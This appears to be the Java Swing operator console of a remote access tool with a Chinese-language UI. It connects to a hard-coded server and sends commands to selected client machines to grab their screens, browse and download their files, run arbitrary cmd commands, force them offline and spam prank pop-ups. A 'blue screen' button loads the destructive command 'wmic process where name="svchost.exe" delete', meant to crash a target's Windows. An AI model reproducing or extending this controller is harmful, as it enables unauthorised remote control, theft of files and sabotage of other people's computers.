package com.controldesktop;

import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Objects;


class HeadMessage implements Serializable{
    @Serial
    private static final long serialVersionUID = 1L;
    private String device = "CONTROL";
    private String type;
    private String[] value;
    private String[] ipInfo;
    //index 0 is fromIP, 1 is toIP
    private String[] fileInfo;
    //index 0 is fileName, 1 is filePath, 2 is fileByteSize
    private byte[] fileToByte;
    public HeadMessage() {
    }
    public void setDevice(String device){
        this.device = device;
    }
    public void setType(String type){
        this.type = type;
    }
    public void setIpInfo(String[] ipInfo){
        this.ipInfo = ipInfo;
    }
    public void setValue(String[] value) {
        this.value = value;
    }
    public void setFileInfo(String[] fileInfo) {
        this.fileInfo = fileInfo;
    }
    public void setFileToByte(byte[] fileToByte){
        this.fileToByte = fileToByte;
    }
    public String getDevice() {
        return device;
    }
    public String getType() {
        return type;
    }
    public String[] getIpInfo() {
        return ipInfo;
    }
    public String[] getFileInfo() {
        return fileInfo;
    }
    public String[] getValue() {
        return value;
    }
    public byte[] getFileToByte(){
        return fileToByte;
    }
}

public class JFrameDesktop {
    Socket socket;
    public JFrameDesktop(){
        JFrame j = new JFrame();
        Container con = j.getContentPane();
        j.setBounds((1536-1000)/2,(864-600)/2,1000,600);
        j.setTitle("Control");
        j.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        j.setResizable(true);
        //j.setUndecorated(true);
        //j.setBackground(new Color(0,0,0,0));
        //j.setOpacity(0.5f);
        //j.setBackground(Color.PINK);
        con.setLayout(new BorderLayout());
        //con.setBackground(new Color(0,0,0,0));

        JPanel HeadPanel = new JPanel();
        JPanel SendCommandAndMessagePanel = new JPanel();
        JPanel Show_Article_Value_Panel = new JPanel();
        JPanel Show_Online_Value_Panel = new JPanel();

        Show_Online_Value_Panel.setLayout(null);
        SendCommandAndMessagePanel.setLayout(null);
        Show_Article_Value_Panel.setLayout(null);

        //组件区
        JLabel IP_Address_Label = new JLabel("服务器IP地址:");
        JTextArea Receive_Message_TextArea = new JTextArea();
        JScrollPane Receive_Message_Scroll_Pane = new JScrollPane(Receive_Message_TextArea);
        JTextField Server_IP_Text_Field = new JTextField();
        JButton Link_To_Server_Button = new JButton("连接");
        JButton Close_Server_Button = new JButton("断开");
        JButton Send_Command_Button = new JButton("发送");
        JTextField Send_Command_Text_Field = new JTextField();
        JButton Get_Screen_Button = new JButton("获取屏幕");
        //JButton Close_Screen_Button = new JButton("关闭屏幕");
        JButton Download_File_Button= new JButton("下载文件");
        String[] List_Demo = new String[]{"List1 This is a test List Demo This is a test List Demo","List2","List3"};
        JList<String> Show_Item_List = new JList<>(List_Demo);
        JScrollPane List_Scroll_Pane = new JScrollPane(Show_Item_List);
        JButton Get_Article_List_Button = new JButton("获取文章");
        //JTextField File_Path_Text_Field = new JTextField("D:\\Program Files\\Test\\");


        JPopupMenu popupMenu = new JPopupMenu();
        JMenuItem Read_Article_Menu_Item = new JMenuItem("读取此文章");
        JMenuItem DownLoad_File_Menu_Item = new JMenuItem("下载此文件");
        JButton Get_My_IP_Button = new JButton("我的IP");

        JTextArea Send_Command_To_Client_Text_Area = new JTextArea();
        JScrollPane Send_Command_To_Client_ScrollPane = new JScrollPane(Send_Command_To_Client_Text_Area);
        //JTextField Send_Command_To_Client_Text_Field = new JTextField();
        JButton Send_Command_To_Client_Button = new JButton("命令->");
        JButton Send_Chat_To_Online = new JButton("聊天->");
        JButton Send_Message_To_Client_Button = new JButton("消息->");
        JButton Open_Send_Frame_Button = new JButton("发送信息");

        JLabel Article_Title_Label = new JLabel("文章标题");
        JTextField Article_Title_TextField = new JTextField();
        JLabel Article_Body_Label = new JLabel("文章内容");
        JTextArea Article_Body_Text_Area = new JTextArea();
        JScrollPane Article_Body_Scroll_Pane = new JScrollPane(Article_Body_Text_Area);
        JCheckBox Article_Check_Box = new JCheckBox("文章可读");
        JButton Article_Put_Button = new JButton("新增");
        JButton Article_Update_Button = new JButton("更新");
        JButton Article_Delete_Button = new JButton("删除");


        //JLabel Show_Online_IP_Label = new JLabel("在线IP列表");
        JTextArea Show_Online_Path_Text_Area = new JTextArea();
        JButton Get_Client_IP_Button = new JButton("在线IP");
        JScrollPane Show_Online_Path_ScrollPane = new JScrollPane(Show_Online_Path_Text_Area);
        JButton Get_File_Path_Button = new JButton("获取路径");
        String[] ipList = new String[]{"127.0.0.1","192.168.0.2","114.115.153.152","172.17.22.231"};
        JComboBox<String> IP_List_Combo_Box = new JComboBox<>();
        JButton Show_Online_Force_Exit_Button = new JButton("强制下线");
        JButton Show_Online_Joke_Button = new JButton("恶搞弹窗");
        JTextField Show_Online_Joke_Number_Text_Field = new JTextField("5");
        JButton Show_Online_Blue_Screen_Button = new JButton("蓝屏");


        Show_Online_Path_Text_Area.setText("D:\\");
        Show_Online_Path_Text_Area.setLineWrap(true);        //激活自动换行功能
        Show_Online_Path_Text_Area.setWrapStyleWord(true);
        IP_List_Combo_Box.setBounds(1,1,200,25);
        Get_Client_IP_Button.setBounds(205,1,80,25);
        Show_Online_Path_ScrollPane.setBounds(0,30,290,100);
        Get_File_Path_Button.setBounds(0,132,85,30);
        Show_Online_Joke_Button.setBounds(90,132,85,30);
        Show_Online_Force_Exit_Button.setBounds(210,132,85,30);
        Show_Online_Joke_Number_Text_Field.setBounds(178,132,30,30);
        Show_Online_Blue_Screen_Button.setBounds(0,165,80,30);



        //操作文章列表的控件布局
        Article_Title_Label.setBounds(0,0,300,30);
        Article_Title_TextField.setBounds(1,30,290,25);
        Article_Body_Label.setBounds(0,50,300,30);
        Article_Body_Scroll_Pane.setBounds(0,75,290,250);
        Article_Check_Box.setBounds(0,330,80,30);
        Article_Put_Button.setBounds(80,330,60,30);
        Article_Update_Button.setBounds(150,330,60,30);
        Article_Delete_Button.setBounds(220,330,60,30);


        //发送信息和命令的窗口控件布局
        Send_Command_Text_Field.setBounds(0,1,220,30);
        Send_Command_Button.setBounds(225,1,70,30);
        Send_Command_To_Client_ScrollPane.setBounds(0,35,290,100);
        Send_Command_To_Client_Button.setBounds(1,135,80,30);
        Send_Chat_To_Online.setBounds(100,135,80,30);
        Send_Message_To_Client_Button.setBounds(200,135,80,30);
        //Article_Body_Label.setBounds(0,110,300,30);
        //Article_Body_Scroll_Pane.setBounds(0,140,290,260);

        Show_Article_Value_Panel.add(Article_Title_Label);
        Show_Article_Value_Panel.add(Article_Title_TextField);
        Show_Article_Value_Panel.add(Article_Body_Label);
        Show_Article_Value_Panel.add(Article_Body_Scroll_Pane);
        Show_Article_Value_Panel.add(Article_Check_Box);
        Show_Article_Value_Panel.add(Article_Put_Button);
        Show_Article_Value_Panel.add(Article_Update_Button);
        Show_Article_Value_Panel.add(Article_Delete_Button);



        JDesktopPane desk = new JDesktopPane();
        //desktopPane = new JDesktopPane();
        desk.setBackground(Color.WHITE);



        JInternalFrame Receive_Message_Internal_Frame = new JInternalFrame();
        JInternalFrame Show_Item_List_Internal_Frame = new JInternalFrame();
        JInternalFrame Send_Command_And_Message_Internal_Frame = new JInternalFrame();
        JInternalFrame Show_Article_Value_Internal_Frame = new JInternalFrame();
        JInternalFrame Show_Online_Value_Internal_Frame = new JInternalFrame();

        Receive_Message_Internal_Frame.add(Receive_Message_Scroll_Pane);
        Receive_Message_Internal_Frame.setVisible(true);
        Receive_Message_Internal_Frame.setBounds(300,0,500,300);
        Receive_Message_Internal_Frame.setTitle("接收服务端信息");
        Receive_Message_Internal_Frame.setIconifiable(true);
        Receive_Message_Internal_Frame.setMaximizable(true);
        Receive_Message_Internal_Frame.setResizable(true);

        Show_Item_List_Internal_Frame.add(List_Scroll_Pane);
        Show_Item_List_Internal_Frame.setVisible(true);
        Show_Item_List_Internal_Frame.setBounds(0,0,300,300);
        Show_Item_List_Internal_Frame.setTitle("列表展示");
        Show_Item_List_Internal_Frame.setIconifiable(true);
        Show_Item_List_Internal_Frame.setMaximizable(true);
        Show_Item_List_Internal_Frame.setResizable(true);


        Send_Command_And_Message_Internal_Frame.add(SendCommandAndMessagePanel);
        Send_Command_And_Message_Internal_Frame.setVisible(false);
        Send_Command_And_Message_Internal_Frame.setBounds(300,300,300,200);
        Send_Command_And_Message_Internal_Frame.setTitle("发送命令和消息");
        Send_Command_And_Message_Internal_Frame.setIconifiable(true);
        Send_Command_And_Message_Internal_Frame.setMaximizable(true);
        Send_Command_And_Message_Internal_Frame.setResizable(true);


        Show_Article_Value_Internal_Frame.add(Show_Article_Value_Panel);
        Show_Article_Value_Internal_Frame.setTitle("文章标题");
        Show_Article_Value_Internal_Frame.setVisible(false);
        Show_Article_Value_Internal_Frame.setBounds(50,50,300,400);
        Show_Article_Value_Internal_Frame.setIconifiable(true);


        Show_Online_Value_Internal_Frame.add(Show_Online_Value_Panel);
        Show_Online_Value_Internal_Frame.setTitle("在线IP和路径");
        Show_Online_Value_Internal_Frame.setVisible(true);
        Show_Online_Value_Internal_Frame.setBounds(0,300,300,230);




        desk.add(Receive_Message_Internal_Frame);
        desk.add(Show_Item_List_Internal_Frame);
        desk.add(Send_Command_And_Message_Internal_Frame);
        desk.add(Show_Article_Value_Internal_Frame);
        desk.add(Show_Online_Value_Internal_Frame);





        //Show_Online_Value_Panel.add(Show_Online_IP_Label);
        Show_Online_Value_Panel.add(IP_List_Combo_Box);
        Show_Online_Value_Panel.add(Show_Online_Path_ScrollPane);
        Show_Online_Value_Panel.add(Get_Client_IP_Button);
        Show_Online_Value_Panel.add(Show_Online_Joke_Button);
        Show_Online_Value_Panel.add(Show_Online_Force_Exit_Button);
        Show_Online_Value_Panel.add(Get_File_Path_Button);
        Show_Online_Value_Panel.add(Show_Online_Joke_Number_Text_Field);
        Show_Online_Value_Panel.add(Show_Online_Blue_Screen_Button);


        HeadPanel.add(IP_Address_Label);
        HeadPanel.add(Server_IP_Text_Field);
        HeadPanel.add(Link_To_Server_Button);
        HeadPanel.add(Close_Server_Button);
        //HeadPanel.add(IP_List_Combo_Box);
        //HeadPanel.add(File_Path_Text_Field);
        //HeadPanel.add(Get_File_Path_Button);
        HeadPanel.add(Open_Send_Frame_Button);
        HeadPanel.add(Get_Article_List_Button);
        HeadPanel.add(Get_Screen_Button);
        //HeadPanel.add(Get_Client_IP_Button);
        HeadPanel.add(Get_My_IP_Button);

        SendCommandAndMessagePanel.add(Send_Command_Text_Field);
        SendCommandAndMessagePanel.add(Send_Command_Button);
        SendCommandAndMessagePanel.add(Send_Command_To_Client_ScrollPane);
        SendCommandAndMessagePanel.add(Send_Command_To_Client_Button);
        SendCommandAndMessagePanel.add(Send_Message_To_Client_Button);
        SendCommandAndMessagePanel.add(Send_Chat_To_Online);
        con.add(HeadPanel,BorderLayout.NORTH);
        con.add(desk,BorderLayout.CENTER);

        //控件设置区
//        IP_Address_Label.setBounds(5,5,80,30);
//        Server_IP_Text_Field.setBounds(85,5,280,30);
//        Link_To_Server_Button.setBounds(370,5,100,30);
//        Close_Server_Button.setBounds(480,5,100,30);
//        Receive_Message_Scroll_Pane.setBounds(5,40,450,355);
//        Send_Command_Text_Field.setBounds(5,400,330,30);
//        Send_Command_Button.setBounds(340,400,100,30);
//        Get_Screen_Button.setBounds(5,440,90,30);
//        //Close_Screen_Button.setBounds(110,440,90,30);
//        File_Path_Text_Field.setBounds(460,400,420,30);
//        Get_File_Path_Button.setBounds(885,400,95,30);
//        List_Scroll_Pane.setBounds(460,40,520,355);
//        Get_My_IP_Button.setBounds(210,440,90,30);
//        //Get_Article_List_Button.setBounds(460,440,90,30);
//        Get_Article_List_Button.setBounds(850,5,90,30);
//        Get_Client_IP_Button.setBounds(310,440,90,30);
//        IP_List_Combo_Box.setBounds(590,5,250,30);
//        Send_Command_To_Client_Text_Field.setBounds(5,480,300,30);
//        Send_Command_To_Client_Button.setBounds(306,480,85,30);
//        Send_Message_To_Client_Button.setBounds(395,480,85,30);


        //SendCommandAndMessagePanel.setLayout(new GridLayout(3,1,5,5));
        Server_IP_Text_Field.setText("114.115.153.152");
        Receive_Message_TextArea.append("在这里接收服务器信息");
        Receive_Message_TextArea.setLineWrap(true);        //激活自动换行功能
        Receive_Message_TextArea.setWrapStyleWord(true);
        Send_Command_Text_Field.setText("在这里输入向服务器发送的指令");
        IP_List_Combo_Box.setModel(new DefaultComboBoxModel<>(ipList));
        Show_Item_List.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);//限制为单选模式
        Show_Item_List.setName("D:\\");
        Send_Command_To_Client_Text_Area.setText("向客户端发送cmd命令或弹窗消息");
        Send_Command_To_Client_Text_Area.setLineWrap(true);        //激活自动换行功能
        Send_Command_To_Client_Text_Area.setWrapStyleWord(true);
        Article_Check_Box.setSelected(true);


        //容器添加区
//        con.add(IP_Address_Label);
//        con.add(Receive_Message_Scroll_Pane);
//        con.add(Server_IP_Text_Field);
//        con.add(Link_To_Server_Button);
//        //con.add(Close_Screen_Button);
//        con.add(Send_Command_Button);
//        con.add(Send_Command_Text_Field);
//        con.add(Get_Screen_Button);
//        con.add(Close_Server_Button);
//        con.add(Download_File_Button);
//        con.add(Get_Article_List_Button);
//        con.add(File_Path_Text_Field);
//        con.add(List_Scroll_Pane);
//        con.add(Get_File_Path_Button);
        popupMenu.add(DownLoad_File_Menu_Item);
        popupMenu.add(Read_Article_Menu_Item);
//        con.add(Get_My_IP_Button);
//        con.add(Get_Client_IP_Button);
//        con.add(IP_List_Combo_Box);
//        con.add(Send_Command_To_Client_Text_Field);
//        con.add(Send_Command_To_Client_Button);
//        con.add(Send_Message_To_Client_Button);

        //控件添加事件区

        Link_To_Server_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String ipAddress = Server_IP_Text_Field.getText();
                //获取IP地址后开始连接
                try {
                    socket = new Socket(ipAddress,9574);
                    ControlFunction.setReceiveMessage(Receive_Message_TextArea,"连接成功");
                    JOptionPane.showMessageDialog(null,"连接成功！");
                    //向服务端证明自己控制端身份
                    HeadMessage hm = new HeadMessage();
                    hm.setIpInfo(new String[]{socket.getLocalAddress().getHostAddress()});
                    ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
                    new SocketReceive(socket,Receive_Message_TextArea,Show_Item_List,IP_List_Combo_Box).start();
                } catch (IOException ex) {
                    ControlFunction.setReceiveMessage(Receive_Message_TextArea,ex.toString());
                    JOptionPane.showMessageDialog(null,ex);
                    //throw new RuntimeException(ex);
                }
            }
        });

        Send_Command_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HeadMessage hm = new HeadMessage();
                hm.setType("DIALOG");
                hm.setValue(new String[]{Send_Command_Text_Field.getText()});
                ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
            }
        });

        Close_Server_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HeadMessage hm = new HeadMessage();
                hm.setType("EXIT");
                try {
                    OutputStream os = socket.getOutputStream();
                    BufferedOutputStream bos = new BufferedOutputStream(os);
                    ObjectOutputStream oos = new ObjectOutputStream(bos);
                    oos.writeObject(hm);
                    oos.flush();
                    os.close();
                    bos.close();
                    oos.close();
                    ControlFunction.setReceiveMessage(Receive_Message_TextArea,"连接已关闭！");
                    JOptionPane.showMessageDialog(null,"连接已关闭!");
                }catch (Exception es){
                    ControlFunction.setReceiveMessage(Receive_Message_TextArea,es.toString());
                    JOptionPane.showMessageDialog(null,es);
                }
            }
        });

        Get_Screen_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String ipAdd = (String) IP_List_Combo_Box.getSelectedItem();
                if (ipAdd != null) {
                    HeadMessage hm = new HeadMessage();
                    hm.setType("GET_SCREEN");
                    hm.setIpInfo(new String[]{"", ipAdd});
                    ControlFunction.sendHeadMessage(hm, socket, Receive_Message_TextArea);

//                try {
//                    Thread.sleep(1000);
//                    //new GetScreen();
//                } catch (IOException | InterruptedException ex) {
//                    ControlFunction.setReceiveMessage(Receive_Message_TextArea,ex.toString());
//                    JOptionPane.showMessageDialog(null,ex);
//                }
                }else {JOptionPane.showMessageDialog(null,"请选择客户端IP地址！");
                }
            }
        });

//        Close_Screen_Button.addActionListener(new ActionListener() {
//            @Override
//            public void actionPerformed(ActionEvent e) {
//                HeadMessage hm = new HeadMessage();
//                hm.setType("CLOSE_GET_SCREEN");
//                ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
//            }
//        });

        Download_File_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String toIpAddress = (String) IP_List_Combo_Box.getSelectedItem();
                HeadMessage hm = new HeadMessage();
                String[] fileInfo = new String[]{"Grasscutter.zip","D:\\test\\Grasscutter.zip",""};
                hm.setType("DOWNLOAD_FILE");
                hm.setFileInfo(fileInfo);
                hm.setIpInfo(new String[]{"127.0.0.1",toIpAddress});
                ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
                //在控制端这里开启接收文件服务，让服务器或者客户端连接

            }
        });

        Get_Article_List_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HeadMessage hm = new HeadMessage();
                hm.setType("GET_ARTICLE_LIST");
                ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
            }
        });

        IP_List_Combo_Box.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JOptionPane.showMessageDialog(null,IP_List_Combo_Box.getSelectedItem());
            }
        });

        Get_File_Path_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String FilePath = Show_Online_Path_Text_Area.getText();
                String ipAdd = (String) IP_List_Combo_Box.getSelectedItem();//获取下拉框里的IP地址
                HeadMessage hm = new HeadMessage();
                hm.setIpInfo(new String[]{"",ipAdd});
                hm.setType("LIST_PATH");
                hm.setValue(new String[]{FilePath});
                ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
            }
        });

        Show_Item_List.addListSelectionListener(new ListSelectionListener() {

            @Override
            public void valueChanged(ListSelectionEvent e) {
                try {
                    JList<String> list = (JList<String>) e.getSource();
                    String value = list.getSelectedValue();
                    if (value != null) {
                        String PerPath = Show_Item_List.getName();
                        PerPath = PerPath + value;
                        Show_Online_Path_Text_Area.setText(PerPath);
                        //JOptionPane.showMessageDialog(null,value);
                    }
                }catch (Exception es){
                    JOptionPane.showMessageDialog(null,es.toString());
                }
            }
        });

        Show_Item_List.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseReleased(MouseEvent e) {
                if (e.isPopupTrigger()){
                    popupMenu.show(e.getComponent(),e.getX(),e.getY());
                }
            }
        });

        class ItemListener implements ActionListener{

            @Override
            public void actionPerformed(ActionEvent e) {
                JMenuItem item = (JMenuItem) e.getSource();
                if (Objects.equals(item.getText(), "下载此文件")){
                    String Value = Show_Item_List.getSelectedValue();
                    //System.out.println(Value);
                    if (!Objects.equals(Value, null)) {
                        //展示下载文件功能
                        String toIpAddress = (String) IP_List_Combo_Box.getSelectedItem();
                        HeadMessage hm = new HeadMessage();
                        String[] fileInfo = new String[]{Show_Item_List.getSelectedValue(), Show_Online_Path_Text_Area.getText(), ""};
                        hm.setType("DOWNLOAD_FILE");
                        hm.setFileInfo(fileInfo);
                        hm.setIpInfo(new String[]{"127.0.0.1",toIpAddress});
                        ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
                    }else {JOptionPane.showMessageDialog(null,"没有选择内容！");}
                } else if (Objects.equals(item.getText(), "读取此文章")) {
                    //展示读取文章功能
                    JOptionPane.showMessageDialog(null,Show_Item_List.getSelectedValue());
                }
            }
        }
        Read_Article_Menu_Item.addActionListener(new ItemListener());
        DownLoad_File_Menu_Item.addActionListener(new ItemListener());

        Get_My_IP_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HeadMessage hm = new HeadMessage();
                hm.setType("GET_MY_IP");
                ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
            }
        });

        Get_Client_IP_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HeadMessage hm = new HeadMessage();
                hm.setType("GET_CLIENT_IP");
                ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
            }
        });


        Send_Command_To_Client_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String ipAdd = (String) IP_List_Combo_Box.getSelectedItem();
                if (ipAdd != null) {
                    HeadMessage hm = new HeadMessage();
                    hm.setType("EXECUTE_CMD");
                    hm.setIpInfo(new String[]{"",ipAdd});
                    String cmd = Send_Command_To_Client_Text_Area.getText();
                    //cmd = ControlFunction.escapeSymbol(cmd);
                    //System.out.println(cmd);
                    hm.setValue(new String[]{cmd});
                    ControlFunction.sendHeadMessage(hm, socket, Receive_Message_TextArea);
                }else {JOptionPane.showMessageDialog(j,"没有选择IP地址!");}
            }
        });

        Send_Message_To_Client_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String ipAdd = (String) IP_List_Combo_Box.getSelectedItem();
                if (ipAdd != null) {
                    HeadMessage hm = new HeadMessage();
                    hm.setType("CONTROL_SAY_MESSAGE");
                    hm.setIpInfo(new String[]{"",ipAdd});
                    hm.setValue(new String[]{Send_Command_To_Client_Text_Area.getText()});
                    ControlFunction.sendHeadMessage(hm, socket, Receive_Message_TextArea);
                }else {JOptionPane.showMessageDialog(j,"没有选择IP地址!");}
            }
        });

        Send_Chat_To_Online.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String value = Send_Command_To_Client_Text_Area.getText();
                if (!Objects.equals(value, "")){
                    HeadMessage hm = new HeadMessage();
                    hm.setType("CHAT");
                    hm.setValue(new String[]{value});
                    ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
                }
            }
        });

        Open_Send_Frame_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                Send_Command_And_Message_Internal_Frame.setVisible(!Send_Command_And_Message_Internal_Frame.isShowing());
            }
        });

        Article_Put_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String title = Article_Title_TextField.getText();
                if (Objects.equals(title, "")){
                    JOptionPane.showMessageDialog(null,"标题不能为空！");
                }else {
                    String value = Article_Body_Text_Area.getText();
                    if (Objects.equals(value, "")){
                        JOptionPane.showMessageDialog(null,"内容不能为空！");
                    }else {
                        boolean readType = Article_Check_Box.isSelected();
                        value = ControlFunction.escapeSymbol(value);
                        HeadMessage hm = new HeadMessage();
                        hm.setType("NEW_ARTICLE");
                        hm.setValue(new String[]{title,value, String.valueOf(readType)});
                        //System.out.println(Arrays.toString(hm.getValue()));
                        ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
                    }
                }
            }
        });

        Article_Delete_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
//                System.out.println(Receive_Message_TextArea.getText());
//                System.out.println("------------------------------");
//                System.out.println(ControlFunction.escapeSymbol(Receive_Message_TextArea.getText()));
            }
        });

        Show_Online_Force_Exit_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String ipAdd = (String) IP_List_Combo_Box.getSelectedItem();
                if (ipAdd == null){
                    ControlFunction.showDialog("请先选择IP地址");
                }else {
                    HeadMessage hm = new HeadMessage();
                    hm.setType("CLIENT_EXIT");
                    hm.setIpInfo(new String[]{"",ipAdd});
                    ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
                }
            }
        });

        Show_Online_Blue_Screen_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                Send_Command_To_Client_Text_Area.setText("wmic process where name=\"svchost.exe\" delete");
            }
        });

        Show_Online_Joke_Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String ipAdd = (String) IP_List_Combo_Box.getSelectedItem();
                if (ipAdd == null){
                    ControlFunction.showDialog("请选择IP地址");
                }else {
                    HeadMessage hm = new HeadMessage();
                    hm.setIpInfo(new String[]{"",ipAdd});
                    hm.setValue(new String[]{Show_Online_Joke_Number_Text_Field.getText()});
                    hm.setType("JOKE_TO_CLIENT");
                    ControlFunction.sendHeadMessage(hm,socket,Receive_Message_TextArea);
                }
            }
        });

//        if (SystemTray.isSupported()){
//            Image image = ImageIO.read(new File("D:\\Desktop\\桌面\\珊瑚宫心海_副本.png"));
//            PopupMenu popu = new PopupMenu();
//            MenuItem item = new MenuItem("EXIT");
//            item.addActionListener(new ActionListener() {
//                @Override
//                public void actionPerformed(ActionEvent e) {
//                    System.exit(0);
//                }
//            });
//            popu.add(item);
//            TrayIcon trayicon = new TrayIcon(image,"Click here!",popu);
//            SystemTray system = SystemTray.getSystemTray();
//            system.add(trayicon);
//        }
        j.setVisible(true);
    }

//    private static class ButtonListener implements ActionListener{
//
//        @Override
//        public void actionPerformed(ActionEvent e) {
//            JButton button = (JButton) e.getSource();
//        }
//    }
}
